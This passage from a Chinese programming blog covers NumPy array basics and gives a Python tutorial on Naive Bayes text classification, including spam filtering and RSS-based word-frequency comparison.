<p>这里的大小和列表的大小保持一致。而当变更shape的时候，例如(3,4)-&gt;(4,3)的时候，并不是对数组进行转置，而只是改变每个轴的大小，<strong>数组元素在内存中的位置并不发生改变</strong>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">c.shape = <span class="number">4</span>,<span class="number">3</span></div><div class="line"><span class="keyword">print</span> c</div><div class="line"></div><div class="line">[[ <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]</div><div class="line"> [ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>]</div><div class="line"> [ <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>]</div><div class="line"> [<span class="number">10</span> <span class="number">11</span> <span class="number">12</span>]]</div></pre></td></tr></table></figure></p>
<p> 当某个轴为-1的时候，蒋根据数组元素的个数自动计算此轴的长度，也就是说，如果你变更的shape是2,-1那么其就会自动计算为2,6<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">c.shape = <span class="number">2</span>,<span class="number">-1</span></div><div class="line"><span class="keyword">print</span> c</div><div class="line"></div><div class="line">[[ <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>]</div><div class="line"> [ <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span>]]</div></pre></td></tr></table></figure></p>
<p> 使用数组的<code>reshape</code>的方法，可以创建一个变更尺寸的新数组，而原数组的shape保持不变。但是<strong>新数组和原数组仍然共享数据存储内存区域</strong>，所以修改任意一个数组的元素都会<strong>变更</strong>另一个数组的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">d = c.reshape((2,-1))</div><div class="line">print d</div><div class="line"></div><div class="line">[[ 1  2  3  4  5  6]</div><div class="line"> [ 7  8  9 10 11 12]]</div></pre></td></tr></table></figure></p>
<p> 数组的元素可以通过<code>dtype</code>属性获得，上面例子中的参数序列的元素都是<code>int</code>，因此创建的数组的元素类型也是整数，你可以通过指定<code>dtype</code>参数来指定元素类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e = numpy.array([1,2,3,4],dtype=numpy.float)</div></pre></td></tr></table></figure></p>
<p> numpy中的数据类型转换，不能直接改原数据的<code>dtype</code>。只能用函数<code>astype()</code>。</p>
<p>而python会自带一些函数来创建数组，可以不需要使用python对象转换为array对象。</p>
<h3 id="arange"><a href="#arange" class="headerlink" title="arange"></a>arange</h3><p>类似于<code>range</code>，通过指定开始、结果以及步长来创建一个一维数组。</p>
<h3 id="linspace"><a href="#linspace" class="headerlink" title="linspace"></a>linspace</h3><p>通过开始设置开始、终值和元素个数来创建等差一维数组，可以通过设置<code>endpoint</code>来指定是否包括终值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">numpy.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">12</span>)</div><div class="line">array([ <span class="number">0</span>\.        ,  <span class="number">0.09090909</span>,  <span class="number">0.18181818</span>,  <span class="number">0.27272727</span>,  <span class="number">0.36363636</span>,</div><div class="line">        <span class="number">0.45454545</span>,  <span class="number">0.54545455</span>,  <span class="number">0.63636364</span>,  <span class="number">0.72727273</span>,  <span class="number">0.81818182</span>,</div><div class="line">        <span class="number">0.90909091</span>,  <span class="number">1</span>\.        ])</div></pre></td></tr></table></figure></p>
<h3 id="logspace"><a href="#logspace" class="headerlink" title="logspace"></a>logspace</h3><p>和<code>linspace</code>一样，不过创建等比数列。下面这个例子产生1（10^0）到100（10^2），有20个元素的等比数列。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">numpy.logspace(<span class="number">0</span>,<span class="number">2</span>,<span class="number">20</span>)</div><div class="line">array([   <span class="number">1</span>\.        ,    <span class="number">1.27427499</span>,    <span class="number">1.62377674</span>,    <span class="number">2.06913808</span>,</div><div class="line">          <span class="number">2.6366509</span> ,    <span class="number">3.35981829</span>,    <span class="number">4.2813324</span> ,    <span class="number">5.45559478</span>,</div><div class="line">          <span class="number">6.95192796</span>,    <span class="number">8.8586679</span> ,   <span class="number">11.28837892</span>,   <span class="number">14.38449888</span>,</div><div class="line">         <span class="number">18.32980711</span>,   <span class="number">23.35721469</span>,   <span class="number">29.76351442</span>,   <span class="number">37.92690191</span>,</div><div class="line">         <span class="number">48.32930239</span>,   <span class="number">61.58482111</span>,   <span class="number">78.47599704</span>,  <span class="number">100</span>\.        ])</div></pre></td></tr></table></figure></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>此外使用<code>frombuffer</code>，<code>fromstring</code>，<code>fromfile</code>等函数可以从字节中创建数组</p>
<p>下面以<code>fromstring</code>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/05/09/numpy-e5-85-a5-e9-97-a8/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/08/e6-9c-b4-e7-b4-a0-e8-b4-9d-e5-8f-b6-e6-96-af/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/08/e6-9c-b4-e7-b4-a0-e8-b4-9d-e5-8f-b6-e6-96-af/" itemprop="url">朴素贝叶斯</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-08T17:17:23+08:00">
                2016-05-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/算法/" itemprop="url" rel="index">
                    <span itemprop="name">算法</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在机器学习之中，我们可以通过概率论来进行分类。最简单的就是朴素贝叶斯分类器了。</p>
<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul>
<li>可以处理多类别问题</li>
<li>在数据较少的情况依然有效</li>
</ul>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>对于输入数据的准备方式较为敏感</p>
<h1 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h1><p>贝叶斯决策理论要求计算两个概率$$p1(c<em>{1}|x,y)$$和$$p2(c</em>{2}|x,y)$$：</p>
<ul>
<li>当p1&gt;p2时，那么这个事件属于1</li>
<li>当p1&lt;p2时，那么这个事件属于2</li>
</ul>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol>
<li>收集数据</li>
<li>准备数据</li>
<li>分析数据：特征大的时候适用直方图效果更好</li>
<li>训练算法：计算不同独立特征下的条件概率</li>
<li>测试算法：计算错误率</li>
<li>适用算法</li>
</ol>
<p>假定每个特征需要$$N$$个样本，当我们需要研究$$M$$的时候，此时样本数提升到$$N^{M}$$个了。而当特征之间互相独立的时候，也就是一个特征或者单词出现的可能性和其他临近的单词没有关系的时候，样本数就从$$N^{M}$$降低到$$M*N$$个。</p>
<p>但是我们知道，这样的假设并不正确，因为”青菜”这个单词常出现在”难吃”附近但是很少出现在“垃圾食品”。并且贝叶斯的另一个假设就是，每种特征等值重要。当然这也是很Navie的。</p>
<h1 id="使用Python进行文本分类"><a href="#使用Python进行文本分类" class="headerlink" title="使用Python进行文本分类"></a>使用Python进行文本分类</h1><h2 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h2><p>我们简述一下这个准备数据的过程。我们需要把文本看成是一个单词的向量。我们需要考虑出现再所有文档之中的所有的单词，然后考虑哪些词应该被纳入词汇表，这就是我们的数据准备方式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDataSet</span><span class="params">()</span>:</span></div><div class="line">    postingList = [</div><div class="line">        [<span class="string">'my'</span>,<span class="string">'dog'</span>,<span class="string">'has'</span>,<span class="string">'been'</span>,<span class="string">'lost'</span>],</div><div class="line">        [<span class="string">'you'</span>,<span class="string">'are'</span>,<span class="string">'to'</span>,<span class="string">'raped'</span>],</div><div class="line">    ]</div><div class="line">    classVec = [<span class="number">0</span>,<span class="number">1</span>] <span class="comment"># 1 代表侮辱词汇</span></div><div class="line">    <span class="keyword">return</span> postingList,classVec</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">createVocabList</span><span class="params">(dataSet)</span>:</span></div><div class="line">    vocabSet = set([])</div><div class="line">    <span class="keyword">for</span> document <span class="keyword">in</span> dataSet:</div><div class="line">        vocabSet = vocabSet|set(document)</div><div class="line">        <span class="keyword">return</span> list(vocabSet)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setOfWords2Vec</span><span class="params">(vocabList,inputSet)</span>:</span></div><div class="line">    <span class="comment"># vocabList: 词汇表</span></div><div class="line">    <span class="comment"># inputSet: 测试文档</span></div><div class="line">    returnVec = [<span class="number">0</span>]*len(vocabList)</div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> inputSet:</div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> vocabList:</div><div class="line">            returnVec[vocabList.index(word)] = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"word %s is not in my vocabulary"</span> %word</div><div class="line">    <span class="keyword">return</span> returnVec</div></pre></td></tr></table></figure></p>
<p> 第一个函数<code>loadDataSet()</code>创建了一个实验样本。该函数返回的第一个变量是进行词条切分后的文档集合，而第二个函数则是返回该词条向量是否有侮辱性的留言。</p>
<p>下一个函数<code>createVocabList()</code>则是会创建一个包含在所有文档中出现的不重复的列表，这里还使用了Python中的<code>set</code>。县创建一个空集合，然后将每篇文档返回的新词集合添加到该集合中，操作符|适用于求两个集合的并集。</p>
<p>获得词汇表之后，就可以使用函数<code>setOfWords2Vec()</code>。函数输入参数是词汇表以及某个文档，输出的是文档向量，函数首先会创建一个和词汇表等长的向量，并将其中的元素都设置为0.接着遍历文档中所有的词汇，若出现了词汇表之中的词汇则将输出的文档中的对应的值设置为1。</p>
<h1 id="训练算法"><a href="#训练算法" class="headerlink" title="训练算法"></a>训练算法</h1><p>这里训练主要使用的就是贝叶斯算法了，这里我们给上条件概率公式，这里w值得就是一个向量，由多个之组成：</p>
<p>[p(c<em>{i}|w) = \frac{p(w|c</em>{i})*p(c_{i})}{p(w)}]</p>
<p>我们是用这个公式计算每个类的值，并且比较这两个概率之的大小。在这里使用朴素贝叶斯假设，将$$w$$展开成一个个独立的特征，进而使用连乘的方式计算上述概率，这样救能够简化计算的过程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainNB0</span><span class="params">(trainMatrix,trainCategory)</span>:</span></div><div class="line">    numTrainDocs = len(trainMatrix)</div><div class="line">    numWords = len(trainMatrix[<span class="number">0</span>])</div><div class="line">    pAbusive = sum(trainCategory)/float(numTrainDocs)</div><div class="line">    <span class="comment"># init ratio</span></div><div class="line">    p0Num = zeros(numWords)</div><div class="line">    p1Num = zeros(numWords)</div><div class="line">    p0Denom = <span class="number">0.0</span></div><div class="line">    p1Denom = <span class="number">0.0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numTrainDocs):</div><div class="line">        <span class="keyword">if</span> trainCategory[i] == <span class="number">1</span>:</div><div class="line">            <span class="comment"># if this sentence bingo , then increase every words' value</span></div><div class="line">            p1Num += trainMatrix[i]</div><div class="line">            p1Denom +=sum(trainMatrix[i])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            p0Num += trainMatrix[i]</div><div class="line">            p0Denom +=sum(trainMatrix[i])</div><div class="line">    <span class="comment"># divide each element</span></div><div class="line">    p1Vect = p1Num/p1Denom</div><div class="line">    p0Vect = p0Num/p0Denom</div><div class="line">    <span class="keyword">return</span> p0Vect,p1Vect,pAbusive</div></pre></td></tr></table></figure></p>
<p> 这里还使用了<code>numpy</code>的<code>zeros</code>这个函数。</p>
<p>代码之中输入的参数就是文档矩阵<code>trainMatrix</code>，以及每片文档类别所构成的向量<code>trainCategory</code>。首先计算文档属于侮辱性文档的概率，也就是$$P(1)$$。因为这是一个对立问题，所以$$P(0) = 1-P(1)$$。<strong>对于其他分类问题则需要稍加修改</strong>。</p>
<p>计算$$p(w<em>{i}|c</em>{1})$$和$$p(w<em>{i}|c</em>{0})$$，需要初始化程序之中的分子和分母变量。由于w中元素很多，所以使用NumPy数组快速计算这些值。在for循环之中需要遍历训练集<code>trainMatrix</code>中的所有文档。一单某个词汇在某一文档中出现，则对应的个数（p1Num或者p0Num）就加1，而且在所有的文档之中，该文档的总次数也相应+1.</p>
<p>最后，对每一个元素除以该类别的总次数。利用NumPy可以很好实现，用一个数组除以浮点数即可。</p>
<h1 id="训练算法-1"><a href="#训练算法-1" class="headerlink" title="训练算法"></a>训练算法</h1><p>利用贝叶斯分类器对文档进行分类的时候，当连乘出现的时候，如果其中的一个概率值为0，那么最终的成绩也是0，为了降低这种影响，可以把所有的词出现数初始化为1，并将分母初始化为2。</p>
<p>这里需要把<code>trainNB0()</code>修改为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># update alogrithm</span></div><div class="line">    p0Num = ones(numWords)</div><div class="line">    p1Num = ones(numWords)</div><div class="line">    p0Denom = <span class="number">2.0</span></div><div class="line">    p1Denom = <span class="number">2.0</span></div></pre></td></tr></table></figure></p>
<p> 另一个问题就是向下溢出，这是由于太多很小的数想乘造成的，当计算连乘的时候，由于大部分的因子都太小，只是Python有可能发生四舍五入为0的情况，所以可以通过球自然对数来避免下溢出或者浮点数舍入所造成的误差。而且自然对数也不会造成精度上的缺失。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># divide each element</span></div><div class="line">    p1Vect = log(p1Num/p1Denom)</div><div class="line">    p0Vect = log(p0Num/p0Denom)</div></pre></td></tr></table></figure></p>
<p> 所以简单的贝叶斯分类函数就是这样的了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">classifyNB</span><span class="params">(vec2Classify,p0Vec,p1Vec,pClass1)</span>:</span></div><div class="line">    p1 = sum(vec2Classify*p1Vec)+log(pClass1)</div><div class="line">    p0 = sum(vec2Classify*p0Vec)+log(<span class="number">1.0</span>-pClass1)</div><div class="line">    <span class="keyword">if</span> p1&gt;p0:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p>
<h1 id="准备数据-1"><a href="#准备数据-1" class="headerlink" title="准备数据"></a>准备数据</h1><p>也就是文档词袋模型了。也就是如果一个词在文档之中不止出现一次，这可能意味着这个词是否出现在文档不能表达某种信息。</p>
<p>与之前的setOfWords2Vec()不同的是，每当遇到一个单词，他就会增加词向量中的对应值，而只是把对应的值设为1.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bagOfWords2VecMN</span><span class="params">(vocabList,inputSet)</span>:</span></div><div class="line">    <span class="comment"># navie bags of words model</span></div><div class="line">    <span class="comment"># in this model each words can display many times while set of words can turn up once</span></div><div class="line">    returnVec = [<span class="number">0</span>]*len(vocabList)</div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> inputSet:</div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> vocabList:</div><div class="line">            <span class="comment"># when words show ,it will increase the value of vector's words rather than set value as 1</span></div><div class="line">            returnVec[vocabList.index(word)] +=<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> returnVec</div></pre></td></tr></table></figure></p>
<h1 id="实例：使用朴素贝叶斯过滤垃圾邮件"><a href="#实例：使用朴素贝叶斯过滤垃圾邮件" class="headerlink" title="实例：使用朴素贝叶斯过滤垃圾邮件"></a>实例：使用朴素贝叶斯过滤垃圾邮件</h1><p>朴素贝叶斯分类器最著名的应用及时电子邮件垃圾过滤了，首先我们来看一下如何使用通用框架来解决这个问题。</p>
<h2 id="准备数据：切分文本"><a href="#准备数据：切分文本" class="headerlink" title="准备数据：切分文本"></a>准备数据：切分文本</h2><p>对于一个文本字符串，可以使用Python的string.split() 的方法来对其进行切分。这里由于标点符号也是切分的词，所以分割符是除了单词、数字外的任意字符。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">regEx = re.compile(<span class="string">'\\W*'</span>)</div></pre></td></tr></table></figure></p>
<p> 而在实际处理之中，文本往往含有空字符串，这一点我们需要去除掉。</p>
<p>其次，我们可以发现句子中的第一个单词往往是大写的。这对于我们查找句子是非常有用的，但是这里的文本是词袋，所以所有词的形式应该是统一的，所以可以使用<code>.lower()</code>转成小写或者<code>.upper()</code>转成大写。</p>
<p>但是这样毕竟也是非常理想的，在邮件之中我们往往会碰见很多词，比如解析URL的时候，Get的参数往往会被解析，从而导致出现非常多的碎片。</p>
<h1 id="测试算法：使用朴素贝叶斯进行交叉验证"><a href="#测试算法：使用朴素贝叶斯进行交叉验证" class="headerlink" title="测试算法：使用朴素贝叶斯进行交叉验证"></a>测试算法：使用朴素贝叶斯进行交叉验证</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">textParse</span><span class="params">(bigString)</span>:</span>    <span class="comment">#input is big string, #output is word list</span></div><div class="line">    <span class="keyword">import</span> re</div><div class="line">    listOfTokens = re.split(<span class="string">r'\W*'</span>, bigString)</div><div class="line">    <span class="keyword">return</span> [tok.lower() <span class="keyword">for</span> tok <span class="keyword">in</span> listOfTokens <span class="keyword">if</span> len(tok) &gt; <span class="number">2</span>] </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">spamTest</span><span class="params">()</span>:</span></div><div class="line">    docList=[]; classList = []; fullText =[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</div><div class="line">        wordList = textParse(open(<span class="string">'email/spam/%d.txt'</span> % i).read())</div><div class="line">        docList.append(wordList)</div><div class="line">        fullText.extend(wordList)</div><div class="line">        classList.append(<span class="number">1</span>)</div><div class="line">        wordList = textParse(open(<span class="string">'email/ham/%d.txt'</span> % i).read())</div><div class="line">        docList.append(wordList)</div><div class="line">        fullText.extend(wordList)</div><div class="line">        classList.append(<span class="number">0</span>)</div><div class="line">    vocabList = createVocabList(docList)<span class="comment">#create vocabulary</span></div><div class="line">    trainingSet = range(<span class="number">50</span>); testSet=[]           <span class="comment">#create test set</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        randIndex = int(random.uniform(<span class="number">0</span>,len(trainingSet)))</div><div class="line">        testSet.append(trainingSet[randIndex])</div><div class="line">        <span class="keyword">del</span>(trainingSet[randIndex])  </div><div class="line">    trainMat=[]; trainClasses = []</div><div class="line">    <span class="keyword">for</span> docIndex <span class="keyword">in</span> trainingSet:<span class="comment">#train the classifier (get probs) trainNB0</span></div><div class="line">        trainMat.append(bagOfWords2VecMN(vocabList, docList[docIndex]))</div><div class="line">        trainClasses.append(classList[docIndex])</div><div class="line">    p0V,p1V,pSpam = trainNB0(array(trainMat),array(trainClasses))</div><div class="line">    errorCount = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> docIndex <span class="keyword">in</span> testSet:        <span class="comment">#classify the remaining items</span></div><div class="line">        wordVector = bagOfWords2VecMN(vocabList, docList[docIndex])</div><div class="line">        <span class="keyword">if</span> classifyNB(array(wordVector),p0V,p1V,pSpam) != classList[docIndex]:</div><div class="line">            errorCount += <span class="number">1</span></div><div class="line">            <span class="keyword">print</span> <span class="string">"classification error"</span>,docList[docIndex]</div><div class="line">    <span class="keyword">print</span> <span class="string">'the error rate is: '</span>,float(errorCount)/len(testSet)</div><div class="line">    <span class="comment">#return vocabList,fullText</span></div></pre></td></tr></table></figure>
<p> 第一个函数<code>textParse()</code>接受一个大写的字符串并且解析为字符串列表，其去除掉少于两个字符的字符串，并且把所有字符串都转成小写。</p>
<p>第二个<code>spamTest()</code>进行自动化处理。导入文件夹spam和ham下的文本文件并且将他们解析为词列表。接下来构建一个测试集和一个训练集，两个集合都是随机选出的。选出的数字所对应的文档被添加到测试集，并且也将其从训练集之中剔除，这种方式被称为<strong>留存交叉验证</strong>（hold-out cross validation）。</p>
<p><code>spamTest</code>会输出在10封邮件上的分类错误率。如果发现了错误的话，函数就会输出错分的词表，由此可以了解到究竟是哪些文档发生了错误。如果我们需要更好得估计错误率，那么就应该将上述过程重复多次，并且求出平均值。</p>
<p>这里一直出现的错误是将垃圾邮件误判为正常邮件，而反之效果会比较好一些。</p>
<h1 id="实例：使用朴素贝叶斯分类器从个人广告中获取区域倾向"><a href="#实例：使用朴素贝叶斯分类器从个人广告中获取区域倾向" class="headerlink" title="实例：使用朴素贝叶斯分类器从个人广告中获取区域倾向"></a>实例：使用朴素贝叶斯分类器从个人广告中获取区域倾向</h1><p>在这个例子之中，我们将会从美国两个城市选取一些人，通过分析征婚广告信息从而比较两个城市的人们在广告用词上是否不同。</p>
<h2 id="收集数据：导入RSS源"><a href="#收集数据：导入RSS源" class="headerlink" title="收集数据：导入RSS源"></a>收集数据：导入RSS源</h2><p>首先需要安装<code>feedparse</code>第三方包。</p>
<p>RSS源分类器以及高频去除函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMostFreq</span><span class="params">(vocabList,fullText)</span>:</span></div><div class="line">    <span class="keyword">import</span> operator</div><div class="line">    freqDict = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> vocabList:</div><div class="line">        freqDict[token] = fullText.count(token)</div><div class="line">    sortedFreq = sorted(freqDict.iteritems(),key=operator.itemgetter(<span class="number">1</span>),reverse=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">return</span> sortedFreq[:<span class="number">30</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">localWords</span><span class="params">(feed1,feed0)</span>:</span></div><div class="line">    <span class="keyword">import</span> feedparser</div><div class="line">    docList = []</div><div class="line">    classList = []</div><div class="line">    fullText = []</div><div class="line">    minLen = min(len(feed1[<span class="string">'entries'</span>]),len(feed0[<span class="string">'entries'</span>]))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(minLen):</div><div class="line">        wordList = textParse(feed1[<span class="string">'entries'</span>][i][<span class="string">'summary'</span>])</div><div class="line">        docList.append(wordList)</div><div class="line">        fullText.extend(wordList)</div><div class="line">        classList.append(<span class="number">1</span>)</div><div class="line">        wordList = textParse(feed0[<span class="string">'entries'</span>][i][<span class="string">'summary'</span>])</div><div class="line">        docList.append(wordList)</div><div class="line">        fullText.extend(wordList)</div><div class="line">        classList.append(<span class="number">0</span>)</div><div class="line">    vocabList = createVocabList(docList)</div><div class="line">    topWords = calcMostFreq(vocabList,fullText)</div><div class="line">    <span class="keyword">for</span> pairw <span class="keyword">in</span> topWords :</div><div class="line">        <span class="comment"># remove most frequent words</span></div><div class="line">        <span class="keyword">if</span> pairw[<span class="number">0</span>] <span class="keyword">in</span> vocabList:</div><div class="line">            vocabList.remove(pairw[<span class="number">0</span>])</div><div class="line">    trainingSet = range(<span class="number">2</span>*minLen)</div><div class="line">    testSet = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</div><div class="line">        randIndex = int(random.uniform(<span class="number">0</span>,len(trainingSet)))</div><div class="line">        testSet.append(trainingSet[randIndex])</div><div class="line">        <span class="keyword">del</span>(trainingSet[randIndex])</div><div class="line">    trainMat = []</div><div class="line">    trainClasses = []</div><div class="line">    <span class="keyword">for</span> docIndex <span class="keyword">in</span> trainingSet:</div><div class="line">        trainMat.append(bagOfWords2VecMN(vocabList,docList[docIndex]))</div><div class="line">        trainClasses.append(classList[docIndex])</div><div class="line">    p0v,p1v,pSpam = trainNB0(array(trainMat),array(trainClasses))</div><div class="line">    errorCount = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> docIndex <span class="keyword">in</span> testSet:</div><div class="line">        wordVector = bagOfWords2VecMN(vocabList,docList[docIndex])</div><div class="line">        <span class="keyword">if</span> classifyNB(array(wordVector),p0v,p1v,pSpam)!= classList[docIndex]:</div><div class="line">            errorCount+=<span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'the error rate is : '</span>,float(errorCount)/len(testSet)</div><div class="line">    <span class="keyword">return</span> vocabList,p0v,p1v</div></pre></td></tr></table></figure></p>
